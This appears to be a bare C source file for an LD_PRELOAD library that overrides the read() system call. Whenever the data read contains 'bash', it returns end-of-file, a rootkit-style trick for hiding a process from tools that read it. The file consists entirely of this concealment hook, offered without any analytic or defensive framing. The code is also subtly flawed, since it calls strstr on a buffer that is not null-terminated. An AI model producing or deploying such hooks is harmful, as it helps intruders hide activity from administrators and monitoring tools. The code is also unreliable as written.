#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>

#define PROC_NAME "bash"

ssize_t read(int fd, void *buf, size_t count) {
    ssize_t (*orig_read)(int fd, void *buf, size_t count);
    ssize_t result;

    orig_read = dlsym(RTLD_NEXT, "read");

    result = orig_read(fd, buf, count);
    
    if(strstr(buf, PROC_NAME)) {
        return 0;
    }

    return result;
}
